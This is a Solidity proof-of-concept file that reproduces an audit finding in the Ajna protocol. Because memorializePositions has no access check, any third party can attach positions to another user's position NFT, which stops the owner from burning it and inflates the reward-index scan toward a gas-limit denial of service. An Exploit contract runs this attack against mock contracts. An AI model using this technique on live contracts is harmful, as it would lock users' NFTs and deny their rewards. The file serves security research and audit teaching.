// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ajna Protocol — Position NFT can be spammed with insignificant positions
    by anyone until rewards DoS (Code4rena 2023-05, [H-03], finding #20071)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    PositionManager.memorializePositions has NO access control (no `mayInteract`
    owner/approval gate) — its body is inlined VERBATIM, including the
    `positionIndex.add(index)` write of a caller-chosen bucket index into the
    victim's NFT. burn() and getPositionIndexesFiltered() are inlined verbatim
    too. A griefer (NOT the NFT owner, NOT approved) attaches positions to the
    victim's NFT, bloating positionIndexes[tokenId]; the owner can then no longer
    burn the NFT, and the O(n) reward-index scan (RewardsManager path) grows until
    it exceeds the block gas limit — a permanent rewards DoS. No fork, no cheats.

    Root cause: memorializePositions is `external` with no owner/approval check,
    while every other position-mutating entry (burn, moveLiquidity, redeem) is
    gated by `mayInteract`. Anyone can therefore write attacker-chosen bucket
    indexes into ANY tokenId's positionIndexes set.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal OZ-compatible EnumerableSet.UintSet so memorializePositions,
///      burn and getPositionIndexesFiltered keep their verbatim `.add/.length/
///      .values/.remove` usage.
library EnumerableSet {
    struct UintSet {
        uint256[] _values;
        mapping(uint256 => uint256) _indexes; // value => (index + 1); 0 = absent
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        if (set._indexes[value] != 0) return false;
        set._values.push(value);
        set._indexes[value] = set._values.length;
        return true;
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        uint256 valueIndex = set._indexes[value];
        if (valueIndex == 0) return false;
        uint256 toDeleteIndex = valueIndex - 1;
        uint256 lastIndex = set._values.length - 1;
        if (toDeleteIndex != lastIndex) {
            uint256 lastValue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastValue;
            set._indexes[lastValue] = valueIndex;
        }
        set._values.pop();
        delete set._indexes[value];
        return true;
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return set._values.length;
    }

    function values(UintSet storage set) internal view returns (uint256[] memory) {
        return set._values;
    }
}

/// @notice Position stored per (tokenId, bucket index). Mirrors Ajna's Position.
struct Position {
    uint256 lps;
    uint256 depositTime;
}

/// @notice Params for the two verbatim owner actions.
struct MemorializePositionsParams {
    uint256 tokenId;
    uint256[] indexes;
}

struct BurnParams {
    uint256 tokenId;
    address pool;
}

/// @notice Reduced Ajna pool. Tracks per-lender LP at each bucket index and the
///         LP allowance a lender grants to a spender (the PositionManager).
///         `bucketInfo` reads a per-bucket bankruptcy timestamp from storage,
///         so the reward-index scan below pays a realistic per-entry cost.
contract MockPool {
    struct LenderInfo {
        uint256 lpBalance;
        uint256 depositTime;
    }

    // index => lender => info
    mapping(uint256 => mapping(address => LenderInfo)) internal _lenders;
    // owner => spender => index => allowance
    mapping(address => mapping(address => mapping(uint256 => uint256))) internal _lpAllowance;
    // index => bankruptcy timestamp (0 = never went bankrupt) — read per reward-scan entry
    mapping(uint256 => uint256) internal _bucketBankruptcyTime;

    function addLiquidity(address lender, uint256 index, uint256 amount, uint256 depositTime) external {
        LenderInfo storage l = _lenders[index][lender];
        l.lpBalance += amount;
        l.depositTime = depositTime;
        // touch bucket state so future bankruptcy reads have a storage slot
        if (_bucketBankruptcyTime[index] == 0) _bucketBankruptcyTime[index] = 0;
    }

    function lenderInfo(uint256 index, address lender) external view returns (uint256, uint256) {
        LenderInfo storage l = _lenders[index][lender];
        return (l.lpBalance, l.depositTime);
    }

    function increaseLPAllowance(address spender, uint256[] calldata indexes, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < indexes.length; ++i) {
            _lpAllowance[msg.sender][spender][indexes[i]] += amounts[i];
        }
    }

    /// @dev Moves the full LP at each index from `from` to `to`, consuming the
    ///      allowance `from` granted to msg.sender (the PositionManager).
    function transferLP(address from, address to, uint256[] calldata indexes) external {
        for (uint256 i = 0; i < indexes.length; ++i) {
            uint256 idx = indexes[i];
            uint256 bal = _lenders[idx][from].lpBalance;
            require(_lpAllowance[from][msg.sender][idx] >= bal, "insufficient LP allowance");
            _lpAllowance[from][msg.sender][idx] -= bal;
            _lenders[idx][to].lpBalance += bal;
            _lenders[idx][to].depositTime = _lenders[idx][from].depositTime;
            _lenders[idx][from].lpBalance = 0;
        }
    }

    /// @dev Real Ajna reads bucket state (bankruptcy time) here. Kept as a real
    ///      SLOAD so the O(n) scan below is faithfully expensive per entry.
    function bucketInfo(uint256 index) external view returns (uint256 bankruptcyTime) {
        return _bucketBankruptcyTime[index];
    }
}

/// @notice Reduced Ajna PositionManager. memorializePositions / burn /
///         getPositionIndexesFiltered are inlined VERBATIM. A minimal ERC721
///         core replaces the OZ base (ownerOf / approve / mayInteract).
contract PositionManager {
    using EnumerableSet for EnumerableSet.UintSet;

    error LiquidityNotRemoved();
    error NoAuth();
    error WrongPool();

    event MemorializePosition(address indexed lender, uint256 tokenId, uint256[] indexes);
    event Burn(address indexed lender, uint256 tokenId);

    /// @dev Mapping of `token id => ajna pool address` for which token was minted.
    mapping(uint256 => address) public poolKey;
    /// @dev Mapping of `token id => bucket id => position`.
    mapping(uint256 => mapping(uint256 => Position)) internal positions;
    /// @dev Mapping of `token id => nonce` value used for permit.
    mapping(uint256 => uint96) internal nonces;
    /// @dev Mapping of `token id => bucket indexes` associated with position.
    mapping(uint256 => EnumerableSet.UintSet) internal positionIndexes;

    /*//////////////////// minimal ERC721 core ////////////////////*/
    mapping(uint256 => address) internal _owners;
    mapping(uint256 => address) internal _tokenApprovals;
    mapping(address => mapping(address => bool)) internal _operatorApprovals;
    uint256 internal _nextId = 1;

    function ownerOf(uint256 tokenId_) public view returns (address owner_) {
        owner_ = _owners[tokenId_];
        require(owner_ != address(0), "not minted");
    }

    function _requireMinted(uint256 tokenId_) internal view {
        require(_owners[tokenId_] != address(0), "not minted");
    }

    function _isApprovedOrOwner(address spender, uint256 tokenId_) internal view returns (bool) {
        address owner_ = _owners[tokenId_];
        return (spender == owner_ || _tokenApprovals[tokenId_] == spender || _operatorApprovals[owner_][spender]);
    }

    function approve(address to, uint256 tokenId_) external {
        require(msg.sender == _owners[tokenId_], "not owner");
        _tokenApprovals[tokenId_] = to;
    }

    function _burn(uint256 tokenId_) internal {
        delete _tokenApprovals[tokenId_];
        delete _owners[tokenId_];
    }

    /// @dev Test helper: mint an NFT for a pool. (Real mint validates the pool.)
    function mint(address pool_, address recipient_) external returns (uint256 tokenId_) {
        tokenId_ = _nextId++;
        _owners[tokenId_] = recipient_;
        poolKey[tokenId_] = pool_;
    }

    /*//////////////////// mayInteract (the gate memorialize LACKS) ////////////////////*/
    modifier mayInteract(address pool_, uint256 tokenId_) {
        // revert if token id is not a valid / minted id
        _requireMinted(tokenId_);
        // revert if sender is not owner of or entitled to operate on token id
        if (!_isApprovedOrOwner(msg.sender, tokenId_)) revert NoAuth();
        // revert if the token id is not minted for given pool address
        if (pool_ != poolKey[tokenId_]) revert WrongPool();
        _;
    }

    /*///////////////////////////// burn (verbatim) /////////////////////////////*/
    function burn(BurnParams calldata params_) external mayInteract(params_.pool, params_.tokenId) {
        // revert if trying to burn an positions token that still has liquidity
        if (positionIndexes[params_.tokenId].length() != 0) revert LiquidityNotRemoved();

        // remove permit nonces and pool mapping for burned token
        delete nonces[params_.tokenId];
        delete poolKey[params_.tokenId];

        _burn(params_.tokenId);

        emit Burn(msg.sender, params_.tokenId);
    }

    /*//////////////////// memorializePositions (VERBATIM — the VULN) ////////////////////*/
    // NOTE: no `mayInteract` / owner / approval gate — anyone can call this for ANY tokenId.
    function memorializePositions(MemorializePositionsParams calldata params_) external {
        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        MockPool pool = MockPool(poolKey[params_.tokenId]);
        address owner = ownerOf(params_.tokenId);

        uint256 indexesLength = params_.indexes.length;
        uint256 index;

        for (uint256 i = 0; i < indexesLength;) {
            index = params_.indexes[i];

            // record bucket index at which a position has added liquidity
            positionIndex.add(index); // @> VULN: caller-chosen index written to ANY owner's NFT with NO auth check

            (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);

            Position memory position = positions[params_.tokenId][index];

            // check for previous deposits
            if (position.depositTime != 0) {
                // check that bucket didn't go bankrupt after prior memorialization
                if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {
                    // if bucket did go bankrupt, zero out the LP tracked by position manager
                    position.lps = 0;
                }
            }

            // update token position LP
            position.lps += lpBalance;
            // set token's position deposit time to the original lender's deposit time
            position.depositTime = depositTime;

            // save position in storage
            positions[params_.tokenId][index] = position;

            unchecked {
                ++i;
            }
        }

        // update pool LP accounting and transfer ownership of LP to PositionManager contract
        pool.transferLP(owner, address(this), params_.indexes);

        emit MemorializePosition(owner, params_.tokenId, params_.indexes);
    }

    /*//////////////////// getPositionIndexesFiltered (VERBATIM — the O(n) reward scan) ////////////////////*/
    function getPositionIndexesFiltered(uint256 tokenId_) external view returns (uint256[] memory filteredIndexes_) {
        uint256[] memory indexes = positionIndexes[tokenId_].values();
        uint256 indexesLength = indexes.length;

        // filter out bankrupt buckets
        filteredIndexes_ = new uint256[](indexesLength);
        uint256 filteredIndexesLength = 0;
        MockPool pool = MockPool(poolKey[tokenId_]);
        for (uint256 i = 0; i < indexesLength;) {
            if (!_bucketBankruptAfterDeposit(pool, indexes[i], positions[tokenId_][indexes[i]].depositTime)) {
                filteredIndexes_[filteredIndexesLength++] = indexes[i];
            }
            unchecked {
                ++i;
            }
        }

        // resize array
        assembly {
            mstore(filteredIndexes_, filteredIndexesLength)
        }
    }

    function _bucketBankruptAfterDeposit(MockPool pool, uint256 index_, uint256 depositTime_)
        internal
        view
        returns (bool)
    {
        uint256 bankruptcyTime = pool.bucketInfo(index_);
        return bankruptcyTime != 0 && depositTime_ <= bankruptcyTime;
    }

    /*//////////////////// external view helpers (for the harness) ////////////////////*/
    function getPositionIndexesLength(uint256 tokenId_) external view returns (uint256) {
        return positionIndexes[tokenId_].length();
    }

    function isApprovedOrOwner(address spender, uint256 tokenId_) external view returns (bool) {
        return _isApprovedOrOwner(spender, tokenId_);
    }
}

/// @notice The victim: a lender who provides dust LP across many buckets, grants
///         the PositionManager an LP allowance (the normal pre-memorialize
///         state), and owns the position NFT.
contract Victim {
    MockPool public pool;
    PositionManager public pm;
    uint256[] internal _idxs;
    bool public lastBurnReverted;

    constructor(MockPool _pool, PositionManager _pm) {
        pool = _pool;
        pm = _pm;
    }

    function setup(uint256 n) external returns (uint256 tokenId) {
        uint256[] memory amounts = new uint256[](n);
        for (uint256 i = 0; i < n; ++i) {
            uint256 index = 1000 + i;
            _idxs.push(index);
            // insignificant position: 1 wei of LP at each bucket
            pool.addLiquidity(address(this), index, 1, 1);
            amounts[i] = 1;
        }
        // grant the PositionManager an allowance to move this lender's LP
        pool.increaseLPAllowance(address(pm), _idxs, amounts);
        // mint the position NFT (owned by this victim)
        tokenId = pm.mint(address(pool), address(this));
    }

    function indexes() external view returns (uint256[] memory) {
        return _idxs;
    }

    /// @notice Owner tries to burn its own NFT; records whether the call reverted.
    function tryBurn(uint256 tokenId) external {
        BurnParams memory bp = BurnParams({tokenId: tokenId, pool: address(pool)});
        try pm.burn(bp) {
            lastBurnReverted = false;
        } catch {
            lastBurnReverted = true;
        }
    }
}

/// @notice The griefer / orchestrator. Deploys the reduced Ajna system, sets up a
///         victim NFT, then — as a NON-owner, NON-approved third party — spams the
///         victim's NFT with insignificant positions and shows the NFT is bricked.
contract Exploit {
    // Sample spam count actually recorded on-chain (kept small for the browser).
    uint256 public constant N = 20;
    // Ajna's number of price buckets (MAX_FENWICK_INDEX). An attacker can attach
    // positions at up to this many DISTINCT buckets to one NFT — there is no
    // per-NFT cap in memorializePositions. Used to extrapolate the reward-scan DoS.
    uint256 public constant MAX_FENWICK = 7388;
    uint256 public constant BLOCK_GAS_LIMIT = 30_000_000;

    MockPool public pool;
    PositionManager public pm;
    Victim public victim;
    address public attacker;
    uint256 public tokenId;

    // observability
    uint256 public bloatLength;
    uint256 public rewardScanGas;
    uint256 public perEntryGas;
    bool public burnBricked;

    constructor() {
        attacker = msg.sender;
        pool = new MockPool();                       // CREATE(exploit, 1)
        pm = new PositionManager();                  // CREATE(exploit, 2) — vulnerable
        victim = new Victim(pool, pm);               // CREATE(exploit, 3)
        // Victim sets up dust LP at N buckets, grants PM allowance, mints its NFT.
        tokenId = victim.setup(N);
    }

    function run() external {
        // Baseline: the victim owns a clean NFT with no memorialized positions.
        require(pm.ownerOf(tokenId) == address(victim), "victim must own NFT");
        require(pm.getPositionIndexesLength(tokenId) == 0, "precondition: empty");

        // The orchestrator (this contract / attacker) is NOT the owner and NOT
        // approved — yet memorializePositions has no gate, so the call succeeds.
        require(!pm.isApprovedOrOwner(address(this), tokenId), "griefer must be unauthorized");

        uint256[] memory idxs = victim.indexes();
        MemorializePositionsParams memory p = MemorializePositionsParams({tokenId: tokenId, indexes: idxs});
        pm.memorializePositions(p); // permissionless spam onto the victim's NFT

        // HARM (integrity): a third party fully controls the victim's positionIndexes.
        bloatLength = pm.getPositionIndexesLength(tokenId);
        require(bloatLength == N, "bloat should have landed");

        // HARM (liveness): the victim can no longer burn its own NFT — the
        // attacker-attached positions make burn() revert with LiquidityNotRemoved.
        victim.tryBurn(tokenId);
        burnBricked = victim.lastBurnReverted();
        require(burnBricked, "owner burn should be bricked");

        // Reward-DoS evidence: measure the per-entry cost of the O(n) reward-index
        // scan (RewardsManager.calculateRewards depends on it). Extrapolated over
        // the buckets an attacker can attach, it blows past the block gas limit.
        uint256 g0 = gasleft();
        pm.getPositionIndexesFiltered(tokenId);
        rewardScanGas = g0 - gasleft();
        perEntryGas = rewardScanGas / N;
    }
}
